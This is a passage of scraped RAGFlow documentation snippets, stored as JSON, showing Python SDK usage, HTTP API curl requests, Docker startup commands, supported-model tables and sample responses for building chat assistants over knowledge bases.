[
  {
    "owner": "infiniflow",
    "repo": "ragflow",
    "content": "TITLE: Checking RAGFlow Server Status\nDESCRIPTION: Command to check the status of the RAGFlow server after launch.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/quickstart.mdx#2025-04-10_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ docker logs -f ragflow-server\n```\n\n----------------------------------------\n\nTITLE: Creating a Chat Assistant with RAGFlow SDK in Python\nDESCRIPTION: This snippet demonstrates how to create a chat assistant using the RAGFlow SDK. It includes setting up the RAGFlow object, listing datasets, and creating a chat assistant with specified dataset IDs.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_20\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndatasets = rag_object.list_datasets(name=\"kb_1\")\ndataset_ids = []\nfor dataset in datasets:\n    dataset_ids.append(dataset.id)\nassistant = rag_object.create_chat(\"Miss R\", dataset_ids=dataset_ids)\n```\n\n----------------------------------------\n\nTITLE: Creating a Knowledge Base in RAGFlow\nDESCRIPTION: This image demonstrates the process of creating a new knowledge base in RAGFlow. It shows the user interface for initiating the creation of a knowledge base.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/configure_knowledge_base.md#2025-04-10_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n![create knowledge base](https://github.com/infiniflow/ragflow/assets/93570324/110541ed-6cea-4a03-a11c-414a0948ba80)\n```\n\n----------------------------------------\n\nTITLE: Creating a Chat Assistant in Python using RAGFlow SDK\nDESCRIPTION: This code snippet demonstrates how to create a chat assistant using the RAGFlow SDK. It includes parameters for configuring the assistant's name, avatar, associated datasets, and LLM settings.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_19\n\nLANGUAGE: python\nCODE:\n```\nRAGFlow.create_chat(\n    name: str, \n    avatar: str = \"\", \n    dataset_ids: list[str] = [], \n    llm: Chat.LLM = None, \n    prompt: Chat.Prompt = None\n) -> Chat\n```\n\n----------------------------------------\n\nTITLE: Parsing a File in RAGFlow Knowledge Base\nDESCRIPTION: This image shows the interface for parsing a file within a knowledge base, including options to start parsing and change chunk methods.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/configure_knowledge_base.md#2025-04-10_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n![parse file](https://github.com/infiniflow/ragflow/assets/93570324/5311f166-6426-447f-aa1f-bd488f1cfc7b)\n```\n\n----------------------------------------\n\nTITLE: Chat Completion Request Examples\nDESCRIPTION: cURL command examples for sending chat completion requests, with and without streaming.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_40\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/chats/{chat_id}/completions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data-binary '\n     {\n     }'\n```\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/chats/{chat_id}/completions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data-binary '\n     {\n          \"question\": \"Who are you\",\n          \"stream\": true,\n          \"session_id\":\"9fa7691cb85c11ef9c5f0242ac120005\"\n     }'\n```\n\n----------------------------------------\n\nTITLE: Retrieving Chunks from Datasets in Python using RAGFlow SDK\nDESCRIPTION: This snippet shows how to retrieve chunks from specified datasets using the RAGFlow SDK. It demonstrates uploading a document, adding a chunk, and then retrieving chunks based on various parameters.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_18\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndataset = rag_object.list_datasets(name=\"ragflow\")\ndataset = dataset[0]\nname = 'ragflow_test.txt'\npath = './test_data/ragflow_test.txt'\ndocuments =[{\"display_name\":\"test_retrieve_chunks.txt\",\"blob\":open(path, \"rb\").read()}]\ndocs = dataset.upload_documents(documents)\ndoc = docs[0]\ndoc.add_chunk(content=\"This is a chunk addition test\")\nfor c in rag_object.retrieve(dataset_ids=[dataset.id],document_ids=[doc.id]):\n  print(c)\n```\n\n----------------------------------------\n\nTITLE: Running Retrieval Test in RAGFlow\nDESCRIPTION: This image demonstrates the retrieval testing feature in RAGFlow, showing how to test the knowledge base configuration with sample queries.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/configure_knowledge_base.md#2025-04-10_snippet_7\n\nLANGUAGE: markdown\nCODE:\n```\n![retrieval test](https://github.com/infiniflow/ragflow/assets/93570324/c03f06f6-f41f-4b20-a97e-ae405d3a950c)\n```\n\n----------------------------------------\n\nTITLE: Conversing with an Agent Example in RAGFlow\nDESCRIPTION: Example demonstrating an interactive conversation with an agent, using streaming mode for responses.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_35\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow, Agent\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nAGENT_id = \"AGENT_ID\"\nagent = rag_object.list_agents(id = AGENT_id)[0]\nsession = agent.create_session()    \n\nprint(\"\\n===== Miss R ====\\n\")\nprint(\"Hello. What can I do for you?\")\n\nwhile True:\n    question = input(\"\\n===== User ====\\n> \")\n    print(\"\\n==== Miss R ====\\n\")\n    \n    cont = \"\"\n    for ans in session.ask(question, stream=True):\n        print(ans.content[len(cont):], end='', flush=True)\n        cont = ans.content\n```\n\n----------------------------------------\n\nTITLE: Conversing with Chat Assistant in RAGFlow Python SDK\nDESCRIPTION: Method for asking questions to a chat assistant. Supports streaming mode for responses. Returns a Message object or an iterator of Message objects containing AI responses and references.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_30\n\nLANGUAGE: python\nCODE:\n```\nSession.ask(question: str = \"\", stream: bool = False, **kwargs) -> Optional[Message, iter[Message]]\n```\n\n----------------------------------------\n\nTITLE: Embedding RAGFlow Chat Assistant with iframe\nDESCRIPTION: This HTML snippet demonstrates how to embed a RAGFlow chat assistant into a webpage using an iframe. The iframe URL is generated by RAGFlow and includes necessary parameters for authentication and assistant configuration.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/chat/start_chat.md#2025-04-10_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<iframe src=\"https://cloud.ragflow.ai/embed/chat?api_key=YOUR_API_KEY&assistant_id=YOUR_ASSISTANT_ID\" width=\"100%\" height=\"600px\"></iframe>\n```\n\n----------------------------------------\n\nTITLE: Rendering API Table in MDX for RAGFlow Supported Models\nDESCRIPTION: This code snippet uses a custom APITable component to render a markdown table showing supported AI models in RAGFlow. It includes various providers and their capabilities across different AI functionalities.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/supported_models.mdx#2025-04-10_snippet_0\n\nLANGUAGE: mdx\nCODE:\n```\n```mdx-code-block\n<APITable>\n```\n\n| Provider              | Chat               | Embedding          | Rerank             | Img2txt            | Speech2txt         | TTS                |\n| --------------------- | ------------------ | ------------------ | ------------------ | ------------------ | ------------------ | ------------------ |\n| Anthropic             | :heavy_check_mark: |                    |                    |                    |                    |                    |\n| Azure-OpenAI          | :heavy_check_mark: | :heavy_check_mark: |                    | :heavy_check_mark: | :heavy_check_mark: |                    |\n| BAAI                  |                    | :heavy_check_mark: | :heavy_check_mark: |                    |                    |                    |\n| BaiChuan              | :heavy_check_mark: | :heavy_check_mark: |                    |                    |                    |                    |\n| BaiduYiyan            | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |                    |                    |\n| Bedrock               | :heavy_check_mark: | :heavy_check_mark: |                    |                    |                    |                    |\n| Cohere                | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |                    |                    |\n| DeepSeek              | :heavy_check_mark: |                    |                    |                    |                    |                    |\n| FastEmbed             |                    | :heavy_check_mark: |                    |                    |                    |                    |\n| Fish Audio            |                    |                    |                    |                    |                    | :heavy_check_mark: |\n| Gemini                | :heavy_check_mark: | :heavy_check_mark: |                    | :heavy_check_mark: |                    |                    |\n| Google Cloud          | :heavy_check_mark: |                    |                    |                    |                    |                    |\n| GPUStack              | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |                    | :heavy_check_mark: | :heavy_check_mark: |\n| Groq                  | :heavy_check_mark: |                    |                    |                    |                    |                    |\n| HuggingFace           | :heavy_check_mark: | :heavy_check_mark: |                    |                    |                    |                    |\n| Jina                  |                    | :heavy_check_mark: | :heavy_check_mark: |                    |                    |                    |\n| LeptonAI              | :heavy_check_mark: |                    |                    |                    |                    |                    |\n| LocalAI               | :heavy_check_mark: | :heavy_check_mark: |                    | :heavy_check_mark: |                    |                    |\n| LM-Studio             | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |                    |                    |\n| MiniMax               | :heavy_check_mark: |                    |                    |                    |                    |                    |\n| Mistral               | :heavy_check_mark: | :heavy_check_mark: |                    |                    |                    |                    |\n| ModelScope            | :heavy_check_mark: |                    |                    |                    |                    |                    |\n| Moonshot              | :heavy_check_mark: |                    |                    | :heavy_check_mark: |                    |                    |\n| novita.ai             | :heavy_check_mark: |                    |                    |                    |                    |                    |\n| NVIDIA                | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |                    |                    |\n| Ollama                | :heavy_check_mark: | :heavy_check_mark: |                    | :heavy_check_mark: |                    |                    |\n| OpenAI                | :heavy_check_mark: | :heavy_check_mark: |                    | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |\n| OpenAI-API-Compatible | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |                    |                    |\n| OpenRouter            | :heavy_check_mark: |                    |                    | :heavy_check_mark: |                    |                    |\n| PerfXCloud            | :heavy_check_mark: | :heavy_check_mark: |                    |                    |                    |                    |\n| Replicate             | :heavy_check_mark: | :heavy_check_mark: |                    |                    |                    |                    |\n| PPIO                  | :heavy_check_mark: |                    |                    |                    |                    |                    |\n| SILICONFLOW           | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |                    |                    |\n| StepFun               | :heavy_check_mark: |                    |                    |                    |                    |                    |\n| Tencent Hunyuan       | :heavy_check_mark: |                    |                    |                    |                    |                    |\n| Tencent Cloud         |                    |                    |                    |                    | :heavy_check_mark: |                    |\n| TogetherAI            | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |                    |                    |\n| Tongyi-Qianwen        | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |\n| Upstage               | :heavy_check_mark: | :heavy_check_mark: |                    |                    |                    |                    |\n| VLLM                  | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |                    |                    |\n| VolcEngine            | :heavy_check_mark: |                    |                    |                    |                    |                    |\n| Voyage AI             |                    | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |                    |                    |\n| Xinference            | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |\n| XunFei Spark          | :heavy_check_mark: |                    |                    |                    |                    | :heavy_check_mark: |\n| Youdao                |                    | :heavy_check_mark: | :heavy_check_mark: |                    |                    |                    |\n| ZHIPU-AI              | :heavy_check_mark: | :heavy_check_mark: |                    | :heavy_check_mark: |                    |                    |\n| 01.AI                 | :heavy_check_mark: |                    |                    |                    |                    |                    |\n\n```mdx-code-block\n</APITable>\n```\n```\n\n----------------------------------------\n\nTITLE: Conversing with Chat Assistant Example in RAGFlow\nDESCRIPTION: Example demonstrating an interactive conversation with a chat assistant named 'Miss R', using streaming mode for responses.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_31\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nassistant = rag_object.list_chats(name=\"Miss R\")\nassistant = assistant[0]\nsession = assistant.create_session()    \n\nprint(\"\\n==================== Miss R =====================\\n\")\nprint(\"Hello. What can I do for you?\")\n\nwhile True:\n    question = input(\"\\n==================== User =====================\\n> \")\n    print(\"\\n==================== Miss R =====================\\n\")\n    \n    cont = \"\"\n    for ans in session.ask(question, stream=True):\n        print(ans.content[len(cont):], end='', flush=True)\n        cont = ans.content\n```\n\n----------------------------------------\n\nTITLE: HTML iframe for embedding RagFlow agent into webpage\nDESCRIPTION: This HTML iframe code can be copied and embedded into a third-party webpage to integrate a RagFlow agent. The iframe needs to be placed at a specific location in the target webpage's HTML.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/agent/embed_agent_into_webpage.md#2025-04-10_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<iframe>\n```\n\n----------------------------------------\n\nTITLE: Installing RAGFlow Python SDK\nDESCRIPTION: Command to download and install the RAGFlow Python SDK using pip.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npip install ragflow-sdk\n```\n\n----------------------------------------\n\nTITLE: Changing Chunk Method for a File in RAGFlow\nDESCRIPTION: This image illustrates how to change the chunk method for a specific file within a knowledge base on the Datasets page.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/configure_knowledge_base.md#2025-04-10_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n![change chunk method](https://github.com/infiniflow/ragflow/assets/93570324/ac116353-2793-42b2-b181-65e7082bed42)\n```\n\n----------------------------------------\n\nTITLE: Chunk Method Templates in RAGFlow\nDESCRIPTION: This table outlines various chunk method templates available in RAGFlow, describing their purposes and compatible file formats.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/configure_knowledge_base.md#2025-04-10_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n| **Template** | Description                                                           | File format                                                                                   |\n|--------------|-----------------------------------------------------------------------|-----------------------------------------------------------------------------------------------|\n| General      | Files are consecutively chunked based on a preset chunk token number. | DOCX, XLSX, XLS (Excel97~2003), PPT, PDF, TXT, JPEG, JPG, PNG, TIF, GIF, CSV, JSON, EML, HTML |\n| Q&A          |                                                                       | XLSX, XLS (Excel97~2003), CSV/TXT                                                             |\n| Resume       | Enterprise edition only. You can also try it out on demo.ragflow.io.  | DOCX, PDF, TXT                                                                                |\n| Manual       |                                                                       | PDF                                                                                           |\n| Table        |                                                                       | XLSX, XLS (Excel97~2003), CSV/TXT                                                             |\n| Paper        |                                                                       | PDF                                                                                           |\n| Book         |                                                                       | DOCX, PDF, TXT                                                                                |\n| Laws         |                                                                       | DOCX, PDF, TXT                                                                                |\n| Presentation |                                                                       | PDF, PPTX                                                                                     |\n| Picture      |                                                                       | JPEG, JPG, PNG, TIF, GIF                                                                      |\n| One          | Each document is chunked in its entirety (as one).                    | DOCX, XLSX, XLS (Excel97~2003), PDF, TXT                                                      |\n| Tag          | The knowledge base functions as a tag set for the others.             | XLSX, CSV/TXT                                                                                 |\n```\n\n----------------------------------------\n\nTITLE: Creating a Dataset with RAGFlow\nDESCRIPTION: Example of creating a dataset using the RAGFlow SDK. It demonstrates initializing the RAGFlow object and calling the create_dataset method.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndataset = rag_object.create_dataset(name=\"kb_1\")\n```\n\n----------------------------------------\n\nTITLE: Updating Chunks in RAGFlow\nDESCRIPTION: This image shows the interface for updating individual chunks, including options to add keywords or make manual changes to the chunk content.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/configure_knowledge_base.md#2025-04-10_snippet_6\n\nLANGUAGE: markdown\nCODE:\n```\n![update chunk](https://github.com/infiniflow/ragflow/assets/93570324/1d84b408-4e9f-46fd-9413-8c1059bf9c76)\n```\n\n----------------------------------------\n\nTITLE: Creating OpenAI-Compatible Chat Completion Request\nDESCRIPTION: Example curl command for creating a chat completion through the OpenAI-compatible API endpoint. This request sends a user message to the specified chat ID and requests streaming responses.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/chats_openai/{chat_id}/chat/completions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '{\n        \"model\": \"model\",\n        \"messages\": [{\"role\": \"user\", \"content\": \"Say this is a test!\"}],\n        \"stream\": true\n      }'\n```\n\n----------------------------------------\n\nTITLE: Starting RAGFlow Server with Docker Compose\nDESCRIPTION: Commands to start the RAGFlow server using Docker Compose, with options for CPU or GPU acceleration.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_tzh.md#2025-04-10_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ cd ragflow/docker\n# Use CPU for embedding and DeepDoc tasks:\n$ docker compose -f docker-compose.yml up -d\n\n# To use GPU to accelerate embedding and DeepDoc tasks:\n# docker compose -f docker-compose-gpu.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Python SDK Example for RAGFlow Chat with Variables\nDESCRIPTION: Example Python code using the RAGFlow SDK to create a chat session and pass the 'style' variable based on user input when making requests to the assistant.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/chat/set_chat_variables.md#2025-04-10_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nassistant = rag_object.list_chats(name=\"Miss R\")\nassistant = assistant[0]\nsession = assistant.create_session()    \n\nprint(\"\\n==================== Miss R =====================\\n\")\nprint(\"Hello. What can I do for you?\")\n\nwhile True:\n    question = input(\"\\n==================== User =====================\\n> \")\n    style = input(\"Please enter your preferred style (e.g., formal, informal, hilarious): \")\n    \n    print(\"\\n==================== Miss R =====================\\n\")\n    \n    cont = \"\"\n    for ans in session.ask(question, stream=True, style=style):\n        print(ans.content[len(cont):], end='', flush=True)\n        cont = ans.content\n```\n\n----------------------------------------\n\nTITLE: Starting RAGFlow Server with Docker Compose\nDESCRIPTION: Commands to start the RAGFlow server using Docker Compose, with options for CPU or GPU usage.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ cd ragflow/docker\n# Use CPU for embedding and DeepDoc tasks:\n$ docker compose -f docker-compose.yml up -d\n\n# To use GPU to accelerate embedding and DeepDoc tasks:\n# docker compose -f docker-compose-gpu.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Listing Chunks from a Document in Python using RAGFlow SDK\nDESCRIPTION: This code shows how to list chunks from a document using the RAGFlow SDK. It retrieves a dataset and document, then lists chunks with optional filtering by keywords and pagination.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_15\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndataset = rag_object.list_datasets(\"123\")\ndataset = dataset[0]\ndocs = dataset.list_documents(keywords=\"test\", page=1, page_size=12)\nfor chunk in docs[0].list_chunks(keywords=\"rag\", page=0, page_size=12):\n    print(chunk)\n```\n\n----------------------------------------\n\nTITLE: Viewing Chunking Results in RAGFlow\nDESCRIPTION: This image displays the Chunk page where users can view the results of file chunking and make manual interventions if necessary.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/configure_knowledge_base.md#2025-04-10_snippet_5\n\nLANGUAGE: markdown\nCODE:\n```\n![chunks](https://github.com/infiniflow/ragflow/assets/93570324/0547fd0e-e71b-41f8-8e0e-31649c85fd3d)\n```\n\n----------------------------------------\n\nTITLE: Uploading Documents to a Dataset with RAGFlow\nDESCRIPTION: Example of uploading documents to a dataset using the RAGFlow SDK. It shows creating a dataset and uploading multiple documents with binary content.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_6\n\nLANGUAGE: python\nCODE:\n```\ndataset = rag_object.create_dataset(name=\"kb_name\")\ndataset.upload_documents([{\"display_name\": \"1.txt\", \"blob\": \"<BINARY_CONTENT_OF_THE_DOC>\"}, {\"display_name\": \"2.pdf\", \"blob\": \"<BINARY_CONTENT_OF_THE_DOC>\"}])\n```\n\n----------------------------------------\n\nTITLE: Updating Chat Assistant Configuration with RAGFlow SDK in Python\nDESCRIPTION: This code snippet shows how to update the configuration of an existing chat assistant. It includes creating a RAGFlow object, retrieving a dataset, creating a chat assistant, and then updating its name, LLM settings, and prompt parameters.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_21\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndatasets = rag_object.list_datasets(name=\"kb_1\")\ndataset_id = datasets[0].id\nassistant = rag_object.create_chat(\"Miss R\", dataset_ids=[dataset_id])\nassistant.update({\"name\": \"Stefan\", \"llm\": {\"temperature\": 0.8}, \"prompt\": {\"top_n\": 8}})\n```\n\n----------------------------------------\n\nTITLE: Searching for Knowledge Bases in RAGFlow\nDESCRIPTION: This image shows the search interface for finding knowledge bases by name in RAGFlow.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/configure_knowledge_base.md#2025-04-10_snippet_8\n\nLANGUAGE: markdown\nCODE:\n```\n![search knowledge base](https://github.com/infiniflow/ragflow/assets/93570324/836ae94c-2438-42be-879e-c7ad2a59693e)\n```\n\n----------------------------------------\n\nTITLE: Checking Docker Container Status for RAGFlow Components\nDESCRIPTION: Command to check the status of all Docker containers in RAGFlow deployment. This helps diagnose issues with Elasticsearch, MySQL, Minio and other components.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/faq.mdx#2025-04-10_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ docker ps\n```\n\n----------------------------------------\n\nTITLE: Creating a Chat Session with RAGFlow SDK in Python\nDESCRIPTION: This snippet demonstrates how to create a chat session with an existing chat assistant. It includes retrieving a chat assistant and creating a new session.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_24\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nassistant = rag_object.list_chats(name=\"Miss R\")\nassistant = assistant[0]\nsession = assistant.create_session()\n```\n\n----------------------------------------\n\nTITLE: Deleting a Knowledge Base in RAGFlow\nDESCRIPTION: This image illustrates the process of deleting a knowledge base in RAGFlow, showing the delete option in the knowledge base card menu.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/configure_knowledge_base.md#2025-04-10_snippet_9\n\nLANGUAGE: markdown\nCODE:\n```\n![delete knowledge base](https://github.com/infiniflow/ragflow/assets/93570324/fec7a508-6cfe-4bca-af90-81d3fdb94098)\n```\n\n----------------------------------------\n\nTITLE: Successful Response for Agent Session Creation in JSON\nDESCRIPTION: Example JSON response format for a successful agent session creation request. The response includes the agent configuration with DSL (Domain-Specific Language) details and initial message.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_47\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 0,\n    \"data\": {\n        \"agent_id\": \"b4a39922b76611efaa1a0242ac120006\",\n        \"dsl\": {\n            \"answer\": [],\n            \"components\": {\n                \"Answer:GreenReadersDrum\": {\n                    \"downstream\": [],\n                    \"obj\": {\n                        \"component_name\": \"Answer\",\n                        \"inputs\": [],\n                        \"output\": null,\n                        \"params\": {}\n                    },\n                    \"upstream\": []\n                },\n                \"begin\": {\n                    \"downstream\": [],\n                    \"obj\": {\n                        \"component_name\": \"Begin\",\n                        \"inputs\": [],\n                        \"output\": {},\n                        \"params\": {}\n                    },\n                    \"upstream\": []\n                }\n            },\n            \"embed_id\": \"\",\n            \"graph\": {\n                \"edges\": [],\n                \"nodes\": [\n                    {\n                        \"data\": {\n                            \"label\": \"Begin\",\n                            \"name\": \"begin\"\n                        },\n                        \"dragging\": false,\n                        \"height\": 44,\n                        \"id\": \"begin\",\n                        \"position\": {\n                            \"x\": 53.25688640427177,\n                            \"y\": 198.37155679786412\n                        },\n                        \"positionAbsolute\": {\n                            \"x\": 53.25688640427177,\n                            \"y\": 198.37155679786412\n                        },\n                        \"selected\": false,\n                        \"sourcePosition\": \"left\",\n                        \"targetPosition\": \"right\",\n                        \"type\": \"beginNode\",\n                        \"width\": 200\n                    },\n                    {\n                        \"data\": {\n                            \"form\": {},\n                            \"label\": \"Answer\",\n                            \"name\": \"dialog_0\"\n                        },\n                        \"dragging\": false,\n                        \"height\": 44,\n                        \"id\": \"Answer:GreenReadersDrum\",\n                        \"position\": {\n                            \"x\": 360.43473114516974,\n                            \"y\": 207.29298425089348\n                        },\n                        \"positionAbsolute\": {\n                            \"x\": 360.43473114516974,\n                            \"y\": 207.29298425089348\n                        },\n                        \"selected\": false,\n                        \"sourcePosition\": \"right\",\n                        \"targetPosition\": \"left\",\n                        \"type\": \"logicNode\",\n                        \"width\": 200\n                    }\n                ]\n            },\n            \"history\": [],\n            \"messages\": [],\n            \"path\": [\n                [\n                    \"begin\"\n                ],\n                []\n            ],\n            \"reference\": []\n        },\n        \"id\": \"2581031eb7a311efb5200242ac120005\",\n        \"message\": [\n            {\n                \"content\": \"Hi! I'm your smart assistant. What can I do for you?\",\n                \"role\": \"assistant\"\n            }\n        ],\n        \"source\": \"agent\",\n        \"user_id\": \"69736c5e723611efb51b0242ac120007\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating a Chat Session with RAGFlow SDK in Python\nDESCRIPTION: This code snippet shows how to update an existing chat session. It demonstrates creating a session with a specific name and then updating that name.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_25\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nassistant = rag_object.list_chats(name=\"Miss R\")\nassistant = assistant[0]\nsession = assistant.create_session(\"session_name\")\nsession.update({\"name\": \"updated_name\"})\n```\n\n----------------------------------------\n\nTITLE: Response Format for Chat Completion without Session ID in JSON\nDESCRIPTION: Example JSON response format for a successful chat completion request without a session ID. The response shows streaming data structure with answer content and a newly generated session ID.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_41\n\nLANGUAGE: json\nCODE:\n```\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": {\n        \"answer\": \"Hi! I'm your assistant, what can I do for you?\",\n        \"reference\": {},\n        \"audio_binary\": null,\n        \"id\": null,\n        \"session_id\": \"b01eed84b85611efa0e90242ac120005\"\n    }\n}\ndata:{\n    \"code\": 0,\n    \"message\": \"\",\n    \"data\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Installing RAGFlow Python Dependencies (Full Version)\nDESCRIPTION: Command to install all Python dependencies including optional extras for RAGFlow using the UV package manager.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nuv sync --python 3.10 --all-extras # install RAGFlow dependent python modules\n```\n\n----------------------------------------\n\nTITLE: Updating a Chunk in Python using RAGFlow SDK\nDESCRIPTION: This code demonstrates how to update a chunk's content or configurations using the RAGFlow SDK. It retrieves a dataset and document, adds a chunk, then updates the chunk's content.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_17\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndataset = rag_object.list_datasets(id=\"123\")\ndataset = dataset[0]\ndoc = dataset.list_documents(id=\"wdfxb5t547d\")\ndoc = doc[0]\nchunk = 